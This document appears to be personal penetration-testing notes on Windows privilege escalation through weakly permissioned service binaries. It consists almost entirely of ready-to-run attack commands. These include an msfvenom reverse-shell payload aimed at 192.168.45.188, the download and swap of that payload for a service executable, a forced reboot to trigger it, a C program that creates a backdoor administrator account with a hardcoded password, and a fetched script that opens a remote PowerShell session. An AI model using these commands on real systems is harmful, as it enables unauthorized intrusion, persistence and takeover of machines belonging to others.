# Finding services and permissions
```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\xampp\apache\bin\httpd.exe"
```
-----------------------

# Vulnerable service binary exploitation
```bash
# Check permissions we need F or M
icacls C:\Users\steve\Pictures\example.exe

# Create payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=443 -f exe -o example.exe

# Transfer payload
iwr -uri http://192.168.45.188/example.exe -Outfile example.exe

# Put shell on correct path
move .\example.exe C:\Users\steve\Pictures\example.exe

# Starting the service
net stop example-service
net start example-service
Start-Service example-service
Stop-Service example-service
Restart-Service example-service

---

# If no permission to restart service but service is auto and we have shutdown privilege

# Check auto start
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'example-service'}

> example-serve Auto

# Set shutdown privilege
whoami /priv

> SeShutdownPrivilege 

# shutdown
shutdown /r /t 0
```
-----------------------

# Compile to add user
```bash
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Compile binary
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1

. .\Invoke-RunasCs.ps1

Invoke-RunasCs -Username dave2 -Password 'password123!' -Command powershell.exe -Remote 192.168.45.169:4545
```
